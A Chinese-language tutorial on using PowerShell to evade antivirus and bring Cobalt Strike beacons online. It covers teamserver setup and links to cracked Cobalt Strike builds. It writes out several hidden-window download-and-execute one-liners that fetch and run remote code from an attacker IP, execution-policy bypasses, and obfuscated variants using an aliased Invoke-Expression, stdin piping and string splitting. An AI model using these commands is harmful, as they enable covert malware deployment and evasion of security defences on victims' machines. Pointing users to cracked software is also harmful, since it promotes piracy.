## 简介

通过powershell来进行免杀，达到CS多种姿势绕过AV上线的目的

### 什么是powershell免杀

PowerShell免杀是指通过利用PowerShell脚本执行恶意代码，同时规避或绕过杀毒软件和其他安全措施的技术。由于PowerShell是Windows系统中强大的命令行接口和脚本语言，它可以访问底层的Windows API和系统功能，因此被黑客和安全研究人员用来执行潜在的危险操作。以下是一些相关的知识点和技术：

1. **混淆（Obfuscation）**：
   - PowerShell脚本可以通过各种方法混淆其代码，使得静态分析变得困难。例如，可以使用加密或编码的字符串，改变变量名和函数名，或使用复杂的表达式替代直接的命令。
2. **内存执行（In-Memory Execution）**：
   - 通过将恶意代码直接注入到内存中执行，而不是写入磁盘，可以避免触发基于磁盘的杀毒扫描。PowerShell提供了如`Invoke-Expression` (iex)这样的命令，可以用来执行内存中的代码。
3. **利用系统信任**：
   - PowerShell作为Windows系统的一部分，通常被系统信任。攻击者可以利用这一点，执行看似合法的PowerShell命令，从而绕过基于行为的检测。
4. **远程执行**：
   - PowerShell允许通过远程会话管理功能执行命令。攻击者可以利用这一点在远程系统上执行脚本，而无需在目标机器上留下任何痕迹。
5. **Bypass Execution Policy**：
   - PowerShell的执行策略可以限制脚本的执行，但这些策略并不是安全边界。例如，使用`-ExecutionPolicy Bypass`参数可以绕过这些限制，执行未签名的脚本。
7. **社会工程学（Social Engineering）**：
   - 通过诱骗用户打开PowerShell脚本，例如通过钓鱼邮件或恶意文档，攻击者可以绕过用户权限的限制来执行脚本。

通过这些方法，攻击者可以在不被检测的情况下利用PowerShell执行恶意操作。这需要安全从业者持续更新他们的安全知识和工具，以识别和防御这些威胁。同时，教育用户关于这些潜在攻击的知识也是非常重要的。

### 什么是cs

Cobalt Strike是一个商业渗透测试工具，广泛用于安全培训和网络攻防演练。它提供了一套针对高级持续性威胁（APT）的模拟攻击工具，能够模拟复杂的攻击链路和后期利用活动。

主要特点包括：

- **Beacon**：一个灵活的后门组件，可以通过HTTP、HTTPS、DNS等多种方式与攻击者的服务器通信。
- **团队服务器**：支持多用户协作，使多个操作者可以共享数据和战术信息。
- **攻击包**：提供各种预设的攻击脚本和工具，如社会工程工具、漏洞利用等。

尽管Cobalt Strike在合法的渗透测试中非常有用，但它也常被恶意使用，特别是在定向攻击和网络犯罪中。

#### 安装cs

1. 启动Cobalt Strike需要JDK的支持，所以需要安装Java环境

安装JRE，将允许你运行几乎所有的Java软件

```
apt install default-jre
java -version
```

除了 JRE 之外，您可能还需要 JDK，以便编译和运行一些特定的基于 Java 的软件。

要安装JDK，请执行下面的命令，它也将安装JRE。

```
apt install default-jdk
javac -version
```



CS组件分为客户端(Client)与服务端(Teamserver)。
cobaltstrike.jar是客户端，teamserver是服务端

#### 部署TeamServer

在安装Cobalt Strike时，必须搭建团队服务器(也就是TeamServer服务器)

1. 添加权限

```
chmod +x teamserver cobaltstrike TeamServerImage
```

2. 运行`teamserver`

```
./teamserver <host/teamserver_ip> <teamserver_password> [/path/to/c2.profile] [YYYY-MM-DD]
```

> <host/teamserver_ip>：必选参数，团队服务器的外部可达 IP 地址。
>
> <teamserver_password>：必选参数，密码
>
> [/path/to/c2.profile]：选填，这个参数指定一个「C2 拓展文件」
>
> [YYYY-MM-DD]：选填，此参数以 YYYY-MM-DD 的日期格式指定结束日期

- 服务端开启后，记录下系统返回的端口号
- 这里的密码和端口号都是登陆客户端(控制端)时需要使用的

#### 客户端使用

运行文件夹中的vbs，然后输入相应的服务端IP地址与密码

#### 破解版下载

https://github.com/k8gege/Aggressor

https://github.com/inepts/cobaltstrike4_8

#### 教程

```
https://www.52pojie.cn/forum.php?mod=viewthread&tid=1805635&highlight=Cobalt%2BStrike

https://m.freebuf.com/articles/network/290134.html

https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html
```



### 常见的av有哪些

## powershell

### Powershell三种执行方式

- 本地版
- 远程加载版
- 无阶段（Stageless）版本

其中，远程下载执行是最常见的形式，特点是直接在内存中运行，不在硬盘上留下任何文件。例如，使用以下命令：

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))"
```

参数解释

```powershell
Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。
WindowStyle Hidden（-w Hidden）：隐藏窗口
Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。
NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。
Noexit（-Noe）：执行后不退出Shell。
EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题
```

### powershell六种执行策略

- Unrestricted 权限最高，可以不受限制执行任意脚本
- Restricted **默认策略**，不允许任意脚本的执行
- AllSigned 所有脚本必须经过签名运行
- RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名
- Bypass 指定白名单文件，没有任何限制和提示
- Undefined 没有设置脚本的策略

**进入powershell查看当前机器执行策略** 

```powershell
Get-ExecutionPolicy
```

**通过管理员权限来修改默认执行策略为Unrestricted**

```powershell
Set-ExecutionPolicy Unrestricted
```

### 如何绕过执行策略

我们在渗透中，遇到执行策略配置是默认不执行的，我们再去通过管理员权限去修改就太鸡肋，动作太大了，所以便有了绕过执行策略，去执行我们的脚本以及powershell命令，下面来介绍几种常见的绕过方式。

为便于演示，我们先将执行策略恢复为默认策略`Restricted`(不允许任意脚本的执行)

```powershell
Get-ExecutionPolicy Restricted
```

#### 文件落地

1. 本地读取然后通过管道符运行

```powershell
powershell Get-Content 1.ps1 | powershell -NoProfile -
```

命令解释：

- `Get-Content 1.ps1`：通过`Get-Content`命令逐行读取名为`1.ps1`的PowerShell脚本文件的内容
- `｜`：管道符，用于将一个命令的输出传递作为另一个命令的输入
- `powershell -NoProfile -`：这表示启动一个新的PowerShell进程，`-NoProfile`在启动时不加载任何用户配置文件，这有助于加快启动速度并避免加载可能干扰脚本执行的个性化设置。尾随的`-`符号表示PowerShell应该从标准输入读取要执行的命令。
- 在这个上下文中，整行命令的效果是将`1.ps1`的内容直接通过管道传递到一个新的、干净的PowerShell会话中执行，不经任何中间文件存储，这可以在一定程度上降低被监测到的风险。

2. Bypass执行策略绕过

```powershell
powershell -ExecutionPolicy bypass -File ./1.ps1
```

- `-ExecutionPolicy Bypass`：指定PowerShell的执行策略为`Bypass`，即允许绕过执行策略，这意味着可以执行任何脚本，无论其签名状态如何。
- `-File ./1.ps1`：指定要执行的脚本文件的路径为`./1.ps1`

#### 远程下载

远程下载并通过IEX运行脚本

```powershell
powershell -nop -w hidden -c "IEX (new-object net.webclient).downloadstring('http://192.168.52.23:80/a')"
```

这条命令是在PowerShell中执行远程脚本的一个典型例子：

- `-nop`（NoProfile）：启动PowerShell时不加载任何用户配置文件，这有助于确保脚本行为的一致性，避免配置文件中的设置可能对脚本执行产生影响。
- `-w hidden`：窗口模式设置为隐藏，PowerShell窗口在执行时不会显示，**这通常会被杀软检测到**
- `-c`：指定后面的字符串为要执行的命令。
- `IEX ((new-object net.webclient).downloadstring('http://192.168.52.23:80/a'))`：使用`IEX`（Invoke-Expression）执行从指定URL下载的字符串。这里，`new-object net.webclient`创建一个.NET的WebClient对象，`downloadstring`方法从指定的URL下载脚本内容，并立即执行。

## 绕过AV

### powershell命令混淆

```
powershell set-alias -name cseroad -value Invoke-Expression;cseroad(New-Object Net.WebClient).DownloadString('http://192.168.52.23:80/a')
```

此代码包含以下几个关键部分：

- **`set-alias -name cseroad -value Invoke-Expression`**: `set-alias`命令用于创建一个新的别名。在这里，它将`Invoke-Expression`命令的别名设置为`cseroad`。
- **`cseroad`**: 通过前面设置的别名，这个命令实际上调用了`Invoke-Expression`。此调用表明`cseroad`后面的表达式将被当作PowerShell命令执行。
- **`New-Object Net.WebClient`**: 这部分代码创建了一个`WebClient`对象，该对象用于从网络上下载数据。
- **`DownloadString('http://192.168.52.23:80/a')`**: 这是`WebClient`对象的`DownloadString`方法，用于从指定的URL下载字符串。这通常用于下载并执行远程的PowerShell脚本或其他命令。

```
echo Invoke-Expression(new-object net.webclient).downloadstring('http://192.168.52.23:80/a') | powershell -
```

这行代码使用了两个主要命令：

- **`echo`**: 这在大多数shell中用于输出文本或其他命令的输出。在这里，它输出了一个字符串，这个字符串是一个PowerShell命令。
- **管道符(`|`)**: 将`echo`命令的输出直接传递给另一个命令。
- **`powershell -`**: 这部分指示PowerShell从标准输入（stdin）读取并执行命令。在这里，标准输入来自管道的前一个命令`echo`。

这种方式允许从命令行外部直接将命令字符串传递给PowerShell进行执行，通常用于执行复杂的一行脚本。

```
powershell -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://192.168.52.23:80/a')"
```

- 利用`+` 拼接http达到上线(典型的powershell语法特性，以变量的方式来拆分HTTP）

### powershell代码混淆

#### 手工混淆

解码代码

```
$xx=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DoIt))
```

#### 项目混淆

Invoke-Obfuscation：一款专门做 PowerShell 命令和脚本混淆的项目

github：https://github.com/danielbohannon/Invoke-Obfuscation

混淆教程：https://blog.csdn.net/m0_51345235/article/details/132910423

**省流结论：这些出名的项目基本都会被杀软记录，无法实现免杀**